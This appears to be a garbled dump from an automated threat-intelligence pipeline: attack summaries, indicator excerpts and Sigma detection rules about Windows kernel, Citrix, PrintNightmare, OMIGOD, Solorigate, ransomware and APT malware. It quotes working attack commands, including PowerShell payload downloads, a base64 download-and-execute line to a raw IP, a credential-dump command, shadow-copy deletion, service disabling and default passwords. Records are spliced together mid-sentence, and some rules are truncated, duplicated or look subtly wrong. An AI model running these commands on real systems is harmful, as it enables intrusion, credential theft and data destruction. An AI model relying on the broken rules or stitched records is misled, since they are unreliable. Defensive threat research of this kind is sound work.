pipeline.attack_summary: An attacker exploits a local privilege escalation vulnerability (CVE-2024-35250) in the Microsoft Windows Kernel Streaming Service (MSKSSRV) by triggering an untrusted pointer dereference via IOCTL_KS_PROPERTY with KSPROPERTY_TYPE_UNSERIALIZESET flag. This allows elevation of privileges from a local user to SYSTEM, leveraging kernel-mode driver manipulation and bypassing security checks through a double-fetch vulnerability in the kernel streaming architecture.

ksthunk (Kernel Streaming WOW Thunk Service Driver) is the entry point in Kernel Streaming
ks.sys is one of the core components of Kernel Streaming
portcls.sys CVE-2024-38055 (out-of-bounds read when set dataformat for Pin) CVE-2024-38056

When calling DeviceIoControl, as shown in the figure below, the user's request will be sequentially passed to the corresponding driver for processing. At step 6, ks.sys will determine which driver and handler to hand over your request based on the KSPROPERTY you requested.
ks!UnserializePropertySet function uses KsSynchronousIoControlDevice to execute commands

If we give the property set as KSPROPSETID_DrmAudioStream, there is additional processing at [5]. At [6], we can see that it first checks whether Irp->RequestorMode is KernelMode(0). If it is called from user, it will directly return an error.

In the IOCTL_KS_PROPERTY of Kernel Streaming, to increase efficiency, KSPROPERTY_TYPE_SERIALIZESET and KSPROPERTY_TYPE_UNSERIALIZESET requests are provided to allow users to operate on multiple properties through a single call.

Initial loader replaces the victim's legitimate Windows library 'scesrv.dll' with a malicious one of exactly the same size.
One of them – ipv4.dll – has been placed by the APT with what is, in fact, a downloader for other malicious components.

When the target user runs Winbox Loader software (a utility used for Mikrotik router configuration), this connects to the router and downloads some DLLs (dynamic link libraries) from the router’s file system.
This turned out to be a malicious loader internally named ‘Slingshot’, part of a new, and highly sophisticated attack platform that rivals Project Sauron and Regin in complexity.
Following infection, Slingshot would load a number of modules onto the victim device, including two huge and powerful ones: Cahnadr, the kernel mode module, and GollumApp, a user mode module.

- The attack employs a packer that transforms custom PE samples into base-independent code for easier embedding and process injection. Strings: `base-independentcode`, `Aplibcompressionlibrary`. - The attack uses specific hardcoded parameters in its downloader modules to establish connections and download payloads. Strings: `0x43237FB2`, `0xDEADFOOD`, `0xC0FFEE43`, `0xC0FFEE44`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/09133534/The-Slingshot-APT_report_ENG_final.pdf)
- The attack utilizes specific network protocols and packet filtering techniques to hide its traffic. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/09133534/The-Slingshot-APT_report_ENG_final.pdf)

attack_vector.reasoning: The text clearly describes how the attack begins with a phishing email containing a hyperlink that leads to downloading malware. The initial vector is user interaction with an email attachment, which is a well-established social engineering technique.

pipeline.attack_summary: An attacker sends phishing emails containing hyperlinks to download a 7z archive with NetWire RAT malware. The archive contains an executable that uses anti-analysis techniques like dynamic code extraction and anti-debugging to avoid detection. Once executed, the malware establishes persistence via registry keys, relocates itself to AppData\Install, creates logs in AppData\Logs, and communicates with C2 servers using DNS resolution and TCP connections on port 3366. It collects system information, keystrokes, and credentials, and supports over 80 commands for remote control.

indicators.context: The downloaded file is a 7z file, which contains the new variant of NetWire RAT. After decompressing it, we are able to get an EXE file with the name of "PROFORMA-INVOICE 0990.exe".
The downloaded file is a 7z file, which contains the new variant of NetWire RAT.
As you can see, the malware file download link is: "hxxps[:]//www[.]mediafire[.]com/file/d86hz5qj21lmhrb/PROFORMA-INVOICE_0990.7z/file".
Its domain is found in the decrypted string, which for this variant is "gbam0001.duckdns[.]org:3366".
The process where NetWire was relocated to "C:\Users\user_name\AppData\Roaming\Install\Host.exe".
NetWire continues to create its home key (HKCU\SOFTWARE\NetWire) as well as adding it into the auto-run group in the victim's registry.
NetWire creates a log folder to store the log files of information that it collects from the victim's system. The log folder is located at "%AppData%\Logs".
It checks to see if the current executable file is located in the correct folder (%AppData%\Install) and has the right file name (Host.exe).

It checks to see if the current executable file is located in the correct folder (%AppData%\Install) and has the right file name (Host.exe). If not, it relocates the file into "%AppData%\Install" and renames it as "Host.exe".
Figure 3 shows that it calls the API USER32.GetCursorPos() twice to obtain two mouse cursor positions and then compares them.
It also calls the API ntdll.ZwGetContextThread to obtain the current thread context structure, which contains the CPU debug register status.
call dword ptr [ebp+110] ;kernel32.GetCurrentThread
mov eax, dword ptr [edi+4000] ;Key API address, like kernel32.CreateProcessInternalW

web_enrichment.additional_context:
--- Web search: what other pages add about this attack (from the web, not from the report; each string was found in its page) ---
- The attackers used a specific PowerShell command to download a JPEG file from an internal server during the initial compromise of a Lithuanian organization. Strings: `cmd.exe /Q /c powershell -c "(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\temp\sys.tmp1')"`. (source: https://www.security.com/threat-intelligence/ukraine-wiper-malware-russia)
- The attackers created a scheduled task to execute a suspicious 'postgresql.exe' file on a weekly basis at 11:05 local-time. Strings: `schtasks /run /tn "\Microsoft\Windows\termsrv\licensing\TlsAccess"`. (source: https://www.security.com/threat-intelligence/ukraine-wiper-malware-russia)
- The attackers moved a downloaded file to a specific Windows system directory to execute it as a scheduled task. Strings: `cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\temp\sys.tmp1 CSIDL_WINDOWS\policydefinitions\postgresql.exe`. (source: https://www.security.com/threat-intelligence/ukraine-wiper-malware-russia)
- The attackers used PowerShell commands to check connectivity to specific domains during the attack. Strings: `Execute certutil to check connectivity to trustsecpro[.]com and whatismyip[.]com`. (source: https://www.security.com/threat-intelligence/ukraine-wiper-malware-russia)
- The attackers executed PowerShell commands to download additional JPEG files from compromised web servers. Strings: `Execute a PowerShell command to download another JPEG file from a compromised web server - confluence[.]novus[.]ua`. (source: https://www.security.com/threat-intelligence/ukraine-wiper-malware-russia)
- The attackers used a specific PowerShell command to dump credentials from the compromised machine. Strings: `cmd.exe /Q /c powershell -c "rundll32 C:\windows\system32\comsvcs.dll MiniDump 600 C:\asm\appdata\local\microsoft\windows\winupd.log full"`. (source: https://www.security.com/threat-intelligence/ukraine-wiper-malware-russia)
- The attackers executed several unknown PowerShell scripts with specific parameters. Strings: `powershell -v 2 -exec bypass -File text.ps1`, `powershell -exec bypass gp.ps1`, `powershell -exec bypass -File link.ps1`. (source: https://www.security.com/threat-intelligence/ukraine-wiper-malware-russia)
- The attackers used a specific process lineage to execute commands via SQL Server exploit. Strings: `CSIDL_SYSTEM_DRIVE\program files\microsoft sql server\mssql12.mssqlserver\mssql\binn\sqlservr.exe,CSIDL_SYSTEM\services.exe,CSIDL_SYSTEM\wininit.exe`. (source: https://www.security.com/threat-intelligence/ukraine-wiper-malware-russia)
- The attackers used a specific PowerShell command to download a file from an internal host using SQL Server exploit. Strings: `(New-Object System.Net.WebClient).DownloadFile('hxxp://[INTERNAL_HOST]/label.ico','C:\temp\sys.tmp1')`. (source: https://www.security.com/threat-intelligence/ukraine-wiper-malware-russia)
- The attackers used specific file names for the decoy ransomware deployed alongside the wiper. Strings: `client.exe`, `cdir.exe`, `cname.exe`, `connh.exe`, `intpub.exe`. (source: https://www.security.com/threat-intelligence/ukraine-wiper-malware-russia)
- The attackers used a specific command line to execute the destructive malware via Impacket. Strings: `cmd.exe /Q /c start c:\stage1.exe`. (source: https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/)

kept.finding: Attackers can extract valid VPN sessions from vulnerable Citrix ADC instances by exploiting CVE-2020-8193 authentication bypass vulnerability.
The attack involves using a combination of CVE-2020-8193 (authentication bypass) with either CVE-2020-8195 or CVE-2020-8196 (information disclosure) to achieve remote compromise.
Attackers use password spraying techniques against Citrix Nitro API with common default passwords to facilitate remote code execution.
Attackers deploy web shells and backdoor user accounts to maintain persistent access after initial exploitation.
Attackers scan for common webshells to identify potential access points after initial compromise.
Attackers attempt to extract encrypted LDAP passwords and SSL/TLS keys/certificates from vulnerable devices.
Attackers use REST execution methods with backdoor accounts to exploit the vulnerabilities.
Attackers utilize a JSP shell that modifies the existing welcome.jsp page for command execution without detection.
Attackers use specific HTTP request patterns to exploit the authentication bypass vulnerability in Citrix ADC management interface.

web_enrichment.additional_context:
--- Web search: what other pages add about this attack (from the web, not from the report; each string was found in its page) ---
- Attackers can extract valid VPN sessions from vulnerable Citrix ADC instances by exploiting CVE-2020-8193 authentication bypass vulnerability. (source: https://www.nccgroup.com/research/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/)
- The attack involves using a combination of CVE-2020-8193 (authentication bypass) with either CVE-2020-8195 or CVE-2020-8196 (information disclosure) to achieve remote compromise. (source: https://www.nccgroup.com/research/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/)
- Attackers use password spraying techniques against Citrix Nitro API with common default passwords to facilitate remote code execution. Strings: `nsroot:nsroot`, `root:Unidesk1`, `administrator:Unidesk1`, `root:v9Yx*6uj`. (source: https://www.nccgroup.com/research/rift-f5-cve-2020-5902-and-citrix-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-honeypot-data-release/)
- Attackers deploy web shells and backdoor user accounts to maintain persistent access after initial exploitation. Strings: `snmpd`, `systems`, `f5admin`, `f5_localuser`, `f5_remoteuser`, `root`, `supporter`, `test0`. (source: https://www.nccgroup.com/research/rift-f5-cve-2020-5902-and-citrix-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-honeypot-data-release/)
- Attackers scan for common webshells to identify potential access points after initial compromise. (source: https://www.nccgroup.com/research/rift-f5-cve-2020-5902-and-citrix-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-honeypot-data-release/)
- Attackers attempt to extract encrypted LDAP passwords and SSL/TLS keys/certificates from vulnerable devices. (source: https://www.nccgroup.com/research/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/)
- Attackers use REST execution methods with backdoor accounts to exploit the vulnerabilities. (source: https://www.nccgroup.com/research/rift-f5-cve-2020-5902-and-citrix-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-honeypot-data-release/)
- Attackers utilize a JSP shell that modifies the existing welcome.jsp page for command execution without detection. Strings: `996258ac921c4e1e1d641cb5614fe5e6c19d01ba`, `/usr/local/www/tmui/WEB-INF/classes/org/apache/jsp/tmui/login/welcome_jsp.class`. (source: https://www.nccgroup.com/research/rift-f5-cve-2020-5902-and-citrix-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-honeypot-data-release/)

web_enrichment.additional_context:
--- Web search: what other pages add about this attack (from the web, not from the report; each string was found in its page) ---
- The attack involves using rpcdump.py from impacket to scan for vulnerable hosts by checking for specific RPC protocols. Strings: `rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'`, `Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol`, `Protocol: [MS-RPRN]: Print System Remote Protocol`. (source: https://github.com/cube0x0/CVE-2021-1675/blob/main/README.md)
- The attack requires disabling the Spooler service as a mitigation technique. Strings: `Stop-Service Spooler`, `REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f`. (source: https://github.com/cube0x0/CVE-2021-1675/blob/main/README.md)
- The attack involves creating an SMB share with anonymous access using Windows commands and PowerShell. Strings: `mkdir C:\share`, `icacls C:\share\ /T /grant Anonymous` logon:r`, `icacls C:\share\ /T /grant Everyone:r`, `New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'`, `REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f`, `REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f`, `REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f`, `REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f`. (source: https://github.com/cube0x0/CVE-2021-1675/blob/main/README.md)
- The attack requires modifying the registry to enable insecure printer policies. Strings: `HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint`. (source: https://github.com/cube0x0/CVE-2021-1675/blob/main/README.md)
- The attack involves using a specific Python script with Impacket framework to exploit the vulnerability. Strings: `CVE-2021-1675.py`, `pip3 uninstall impacket`, `git clone https://github.com/cube0x0/impacket`, `python3 ./setup.py install`. (source: https://github.com/cube0x0/CVE-2021-1675/blob/main/README.md)
- The attack requires specific registry values to be present for vulnerability. Strings: `RestrictDriverInstallationToAdministrators    REG_DWORD    0x0`, `NoWarningNoElevationOnInstall    REG_DWORD    0x1`. (source: https://github.com/cube0x0/CVE-2021-1675/blob/main/README.md)
- The attack involves using a specific SMB configuration to host payloads. Strings: `/etc/samba/smb.conf`, `[global]`, `map to guest = Bad User`, `server role = standalone server`, `usershare allow guests = yes`, `idmap config * : backend = tdb`, `smb ports = 445`, `[smb]`, `comment = Samba`, `path = /tmp/`, `guest ok = yes`, `read only = no`, `browsable = yes`, `force user = smbuser`. (source: https://github.com/cube0x0/CVE-2021-1675/blob/main/README.md)
- The attack requires disabling the printer spooler service as a workaround. Strings: `GPO: `Security Settings -> System Services -> Print Spooler -> Disable``, `Registry: `HKLM\SYSTEM\CurrentControlSet\Services\Spooler\Start` = 4`. (source: https://github.com/LaresLLC/CVE-2021-1675)
- The attack involves removing authenticated users from Pre-Windows 2000 Compatible Access group. Strings: `Pre-Windows 2000 Compatible Access group`. (source: https://github.com/LaresLLC/CVE-2021-1675)
- The attack can be detected by monitoring for specific Sysmon events related to spoolsv.exe. Strings: `EventCode=7 Image="C:\\Windows\\System32\\spoolsv.exe" NOT (Signature="Microsoft Windows" SignatureStatus=Valid)`. (source: https://github.com/LaresLLC/CVE-2021-1675)
- The attack can be detected by monitoring for specific Event ID 5145 related to spoolss. Strings: `EventCode=5145 Share_Name="\\*\\IPC$" Relative_Target_Name=spoolss`. (source: https://github.com/LaresLLC/CVE-2021-1675)
- The attack involves detecting specific file modifications in the spool driver directory. Strings: `filemod_name:c\:\\windows\\system32\\spool\\drivers\\x64\\3\\old\\1\\123`. (source: https://github.com/LaresLLC/CVE-2021-1675)
- The attack involves detecting specific module loads in the spool driver directory. Strings: `modload_name:c\:\\windows\\system32\\spool\\drivers\\x64\\3* OR modload_name:c\:\\windows\\system32\\spool\\drivers\\x64\\3\\old*`. (source: https://github.com/LaresLLC/CVE-2021-1675)
- The attack involves detecting unsigned files loaded by spoolsv.exe. Strings: `process_name:spoolsv\.exe AND NOT filemod_publisher_state:FILE_SIGNATURE_STATE_SIGNED`. (source: https://github.com/LaresLLC/CVE-2021-1675)
- The attack involves detecting files signed by non-Microsoft publishers loaded by spoolsv.exe. Strings: `process_name:spoolsv\.exe AND filemod_publisher_state:FILE_SIGNATURE_STATE_SIGNED AND NOT filemod_publisher:"Microsoft Windows*"`. (source: https://github.com/LaresLLC/CVE-2021-1675)
- The attack involves detecting specific DCE RPC events using Zeek scripts. Strings: `Printer_Driver_Changed_Successfully`. (source: https://github.com/corelight/CVE-2021-1675)
- The attack involves detecting specific DCE RPC commands using Suricata rules. title: OMIGOD HTTP No Authentication RCE - CVE-2021-38647
rules_yaml:
title: Unauthenticated WS-Management Command Execution via Missing Auth Header
id: 5a8e3c9d-6f4a-4b2c-9d7e-1a2b3c4d5e6f
status: experimental
description: Detects an unauthenticated HTTP POST request to the /wsman/ endpoint with a WS-Management SOAP payload that lacks an Authorization header, indicating potential exploitation of CVE-2021-38647 (OMIGOD) where attackers bypass authentication to execute shell commands as root.
references:
    - https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure
    - https://corelight.com/blog/detecting-cve-2021-38647-omigod
    - https://www.microsoft.com/en-us/msrc/blog/2021/09/additional-guidance-regarding-omi-vulnerabilities-within-azure-vm-management-extensions
    - https://github.com/marcosimioni/omigood
    - https://www.wiz.io/blog/secret-agent-exposes-azure-customers-to-unauthorized-code-execution
    - https://attack.mitre.org/techniques/T1059/009/
    - https://attack.mitre.org/techniques/T1556/006/
    - https://attack.mitre.org/techniques/T1078/004/
    - https://attack.mitre.org/techniques/T1548/005/
author: Sigma Assistant
date: 2026-10-07
tags:
    - attack.initial-access
    - attack.execution
    - attack.privilege-escalation
    - attack.t1059.009
logsource:
    category: webserver
detection:
    selection:
        cs-method: POST
        cs-uri-query: /wsman/
        cs-user-agent|contains:
            - 'curl'
            - 'python'
            - 'browser'
    filter_auth_header:
        cs-header|contains: Authorization
    condition: selection and not filter_auth_header
falsepositives:
    - Legitimate administrative tools using the wsman endpoint with proper authentication
level: critical

    - https://www.microsoft.com/en-us/msrc/blog/2021/09/additional-guidance-regarding-omi-vulnerabilities-within-azure-vm-management-extensions

    - https://www.wiz.io/blog/secret-agent-exposes-azure-customers-to-unauthorized-code-execution
    - https://attack.mitre.org/techniques/T1059/009/
    - https://attack.mitre.org/techniques/T1556/006/
    - https://attack.mitre.org/techniques/T1078/004/
    - https://attack.mitre.org/techniques/T1548/005/
author: Sigma Assistant
date: 2026-10-07
tags:
    - attack.execution
    - attack.t1059.009
logsource:
    category: webserver
detection:
    selection:
        cs-method: POST
        cs-uri-query: /wsman/

        cs-uri-stem|endswith: ExecuteShellCommand
    condition: selection

    - Legitimate system management tools using the same action URI with proper authentication
level: high

Attackers can execute arbitrary commands on vulnerable systems exposed on ports 5985/5986/1270.

web_enrichment.additional_context:
--- Web search: what other pages add about this attack (from the web, not from the report; each string was found in its page) ---
- The attack uses specific process discovery commands to enumerate running processes, services, and signed-in users on remote systems. Strings: `tasklist /v /s [target]`, `query user /server:[target]`, `schtasks /query /v /s [target] /fo csv`, `sc \\[target] query type=service state=all`. (source: https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)
- The attack uses service control manager to disable security monitoring services on remote systems before lateral movement. Strings: `sc \\[dest_machine] stop [service name]`, `sc \\[source_machine] start [service name]`. (source: https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)
- The attack modifies service start registry keys to disable security monitoring products at system startup. Strings: `reg add HKLM\system\currentcontrolset\services\[service name] /v Start /t REG_DWORD /d 4`. (source: https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)
- The attack uses fsutil to check available free space before executing collection or enumeration activities. Strings: `fsutil volume diskfree c:`. (source: https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)
- The attack uses renamed versions of legitimate tools like ADFIND for domain enumeration and discovery. Strings: `[renamed-adfind].exe -h [internal domain] -sc u:[user] > .\[machine]\[file].[log|txt]`, `[renamed-adfind].exe -sc u:* > .\[folder]\[file].[log|txt]`, `[renamed-adfind].exe -h [machine] -f objectcategory=* > .\[folder]\[file].[log|txt]`. (source: https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)
- The attack uses specific file paths for custom Cobalt Strike loaders that resemble legitimate Windows files. Strings: `C:\Windows\ms\sms\sms.dll`, `C:\Windows\Microsoft.NET\Framework64\sbscmp30.dll`, `C:\Windows\AUInstallAgent\auagent.dll`, `C:\Windows\apppatch\apppatch64\sysmain.dll`, `C:\Windows\Vss\Writers\Application\AppXML.dll`, `C:\Windows\PCHEALTH\health.dll`, `C:\Windows\Registration\crmlog.dll`, `C:\Windows\Cursors\cursrv.dll`, `C:\Windows\AppPatch\AcWin.dll`, `C:\Windows\CbsTemp\cbst.dll`, `C:\Windows\AppReadiness\Appapi.dll`, `C:\Windows\Panther\MainQueueOnline.dll`, `C:\Windows\AppReadiness\AppRead.dll`, `C:\Windows\PrintDialog\PrintDial.dll`, `C:\Windows\ShellExperiences\MtUvc.dll`, `C:\Windows\PrintDialog\appxsig.dll`, `C:\Windows\DigitalLocker\lock.dll`, `C:\Windows\assembly\GAC_64\MSBuild\3.5.0.0__b03f5f7f11d50a3a\msbuild.dll`, `C:\Windows\Migration\WTR\ctl.dll`, `C:\Windows\ELAMBKUP\WdBoot.dll`, `C:\Windows\LiveKernelReports\KerRep.dll`, `C:\Windows\Speech_OneCore\Engines\TTS\en-US\enUS.Name.dll`, `C:\Windows\SoftwareDistribution\DataStore\DataStr.dll`, `C:\Windows\RemotePackages\RemoteApps\RemPack.dll`, `C:\Windows\ShellComponents\TaskFlow.dll`. (source: https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)
- The attack uses specific network domains for command and control communications. Strings: `aimsecurity.net`, `datazr.com`, `ervsystem.com`, `financialmarket.org`, `gallerycenter.org`, `infinitysoftwares.com`, `mobilnweb.com`, `olapdatabase.com`, `swipeservice.com`, `techiefly.com`. (source: https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)
- The attack uses specific process trees involving rundll32.exe and cmd.exe for executing malicious commands. Strings: `rundll32.exe c:\windows\[folder]\[beacon].dll [export]-> cmd.exe /C-> [additional command]`. (source: https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)
- The attack uses specific PowerShell commands for remote execution via WMI. Strings: `Invoke-Command -ComputerName REDACTED -ScriptBlock { rundll32 c:\Packages\Plugins\Microsoft.Powershell.DSC\2.77.0.0\bin\TelemetryStatus.dll Tk_CreateItemType}`, `Invoke-WMIMethod win32_process -name create -argumentlist 'rundll32 c:\windows\Speech_OneCore\Engines\TTS\en-US\enUS.Media.dll TkChangeEventWindow' -ComputerName REDACTED`. - The attack involves using a specific IP address to download C3RB3R ransomware payloads. Strings: `193.176.179[.]41`. (source: https://www.sentinelone.com/blog/c3rb3r-ransomware-ongoing-exploitation-of-cve-2023-22518-targets-unpatched-confluence-servers/)
- The attack uses a specific file name for the ransom note. Strings: `read-me3.txt`. (source: https://www.sentinelone.com/blog/c3rb3r-ransomware-ongoing-exploitation-of-cve-2023-22518-targets-unpatched-confluence-servers/)
- The attack appends a specific extension to encrypted files. Strings: `.L0CK3D`. (source: https://www.sentinelone.com/blog/c3rb3r-ransomware-ongoing-exploitation-of-cve-2023-22518-targets-unpatched-confluence-servers/)
- The attack uses a specific command to remove VSS (Volume Shadow Copies) on Windows systems. Strings: `cmd.exe /c C:\Windows\System32\wbem\WMIC.exe shadowcopy where "ID='{xxxx392B-3896-49EE-8B43-0233022xxxxx}'" delete`. (source: https://www.sentinelone.com/blog/c3rb3r-ransomware-ongoing-exploitation-of-cve-2023-22518-targets-unpatched-confluence-servers/)
- The attack uses a specific command to download and execute payloads on Linux systems. Strings: `sh -c echo -n ZWNobyAtbiBodHRwOi8vMTkzLjE3Ni4xNzkuNDEvYWdhZSA+IC90bXAvbHJ1 | base64 -d | sh`. - The attack involves using a specific C2 (command and control) domain. Strings: `j3qxmk6g5sk3zw62i2yhjnwmhm55rfz47fdyfkhaithlpelfjdokdxad[.]onion`. (source: https://www.sentinelone.com/blog/c3rb3r-ransomware-ongoing-exploitation-of-cve-2023-22518-targets-unpatched-confluence-servers/)
- The attack uses a specific endpoint to exploit the vulnerability. Strings: `/json/setup-restore.action`. (source: https://support.atlassian.com/atlassian-knowledge-base/kb/faq-for-cve-2023-22518/)

pipeline.attack_summary: The Lazarus group conducted two separate attacks targeting a government health ministry and a pharmaceutical company. The first attack used wAgent malware, deployed via command-line execution with rundll32.exe using a 16-byte AES key parameter to decrypt payloads. The second attack used Bookcode malware in a supply chain attack against the pharmaceutical company. Both attacks leveraged persistence mechanisms through Windows services and Security Support Providers, and included credential access techniques such as SAM dumping.

rules_yaml:
title: Initial Access via Command Injection in Barracuda ESG Device
id: 5a8f4c0d-7b2e-4a1f-9c3d-8e6f7a9b1c4d
status: experimental
description: Detects exploitation of unauthenticated command injection vulnerability (CWE-78) in Barracuda ESG devices via HTTP/HTTPS requests to the root endpoint (/), specifically targeting attacker-controlled command parameters (cmd=) or bash command substitution ($\(.*?\)) in request body, indicating initial access attempt.
references:
    - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally
    - https://attack.mitre.org/techniques/T1190/
    - https://attack.mitre.org/techniques/T1659/
author: Sigma Assistant
date: 2026-10-07
tags:
    - attack.initial-access
    - attack.t1190
    - attack.t1659
logsource:
    category: webserver
detection:
    selection_uri:
        cs-uri-query|contains: 'cmd='
    selection_body:
        cs-uri-query|contains: '\$\('
        cs-uri-query|contains: '\)'
    condition: 1 of selection_*
falsepositives:
    - Legitimate administrative scripts using cmd parameter in query string
    - Normal user behavior involving shell metacharacters in non-malicious contexts
level: high

title: Execution via WebSocket Handshake in Barracuda ESG Exploitation
id: 9b3e4f1a-6c5d-4b2e-8f7a-1e9d8c6b5a4f
status: experimental
description: Detects execution of malicious commands in Barracuda ESG exploitation attempts by observing WebSocket handshake requests (Upgrade: websocket) which may be used to bypass filters and establish command execution channels.
references:
    - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally
    - https://attack.mitre.org/techniques/T1190/
    - https://attack.mitre.org/techniques/T1659/
author: Sigma Assistant
date: 2026-10-07
tags:
    - attack.execution
    - attack.t1190
logsource:
    category: webserver
detection:
    selection_header:
        cs-User-Agent|contains: 'websocket'
    condition: selection_header
falsepositives:
    - Normal WebSocket connections for legitimate web applications

web_enrichment.additional_context:
--- Web search: what other pages add about this attack (from the web, not from the report; each string was found in its page) ---
- The Epic backdoor sends system information to C&C servers using HTTP POST requests with Base64-encoded commands in HTML responses. Strings: `Base64-encoded strings enclosed in / tags`, `Wininet API functions for issuing HTTP POST requests`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
- The Epic backdoor collects detailed system information including hardware, OS version, user accounts, network connections, and installed updates. Strings: `Registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SystemInformation`, `value names: SystemManufacturer, SystemProductName`, `All registry subkeys of the key HARDWARE\DESCRIPTION\System\CentralProcessor`, `value name: ProcessorNameString`, `Available system memory status, total/free`, `User name, local group name`, `Common directory names: system, current, temporary directories`, `System and user language settings`, `User locale information: country name, current date, time zone`, `Uptime`, `Disk space information for all available logical drives`, `List of available network shares`, `List of all user accounts, privilege classes, time of the last logon`, `List of current IPV4 TCP connections and UDP listeners`, `Information about installed Windows updates from the file %WINDOWS%\SoftwareDistribution\ReportingEvents.log`, `Detailed list of running processes and their owners`, `List of all window titles`, `Directory listing of available logical drives and of the directories:`, `Desktop`, `%TEMP%`, `%WINDOWS%\Temp`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
- The Epic backdoor creates a hidden console window and registers a keyboard hook procedure for low-level keyboard input events. Strings: `creates a hidden console window`, `_LowLevelKeyboardProc@12`, `WH_KEYBOARD_LL hook`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
- The Epic backdoor appends a header to its log file when starting a new session. Strings: `--------------------------------------------------------------------------------`, `New Session: %fully qualified computer name% %timestamp%`, `--------------------------------------------------------------------------------`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
- The Epic backdoor uses a custom loader to start modules that can function as plugins for the Turla Carbon system. Strings: `can also function as a plugin for the Turla Carbon system`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
- The Epic backdoor drops a keylogger that creates log files in the temporary directory. Strings: `%TEMP%\~DFD3O8.tmp`, `f:\keyhook.log`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
- The Epic backdoor uses specific file paths for its keylogger module. Strings: `Creates the log file: %TEMP%\~DFD3O8.tmp`, `If failed, tries to write to the file f:\keyhook.log`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
- The Epic backdoor uses a specific registry key to identify system information. Strings: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SystemInformation`, `value names: SystemManufacturer, SystemProductName`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
- The Epic backdoor uses a specific registry key to identify processor information. Strings: `All registry subkeys of the key HARDWARE\DESCRIPTION\System\CentralProcessor`, `value name: ProcessorNameString`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
- The Epic backdoor uses a specific command to change C&C URLs. Strings: `down Change the C&C URL to a given value`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
- The Epic backdoor uses a specific command to delete files. Strings: `del_task Delete a file`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
- The Epic backdoor uses a specific command to mark files for upload. Strings: `result Set the filename that is supposed to contain the results of command execution`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
